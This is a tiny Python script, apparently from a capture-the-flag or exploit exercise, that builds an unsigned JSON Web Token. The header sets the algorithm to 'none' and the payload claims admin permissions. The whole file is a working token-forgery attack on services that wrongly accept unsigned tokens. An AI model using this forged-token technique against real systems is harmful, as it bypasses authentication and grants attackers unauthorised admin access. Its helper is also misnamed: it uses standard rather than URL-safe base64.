import base64

def b64urlencode(data):
    return base64.b64encode(data).replace('=', '')

print(b64urlencode("{\"typ\":\"JWT\",\"alg\":\"none\"}") + \
    '.' + b64urlencode("{\"perms\":\"admin\",\"secretid\":\"null\",\"rolled\":\"no\",\"iat\":1556023740}") + '.')
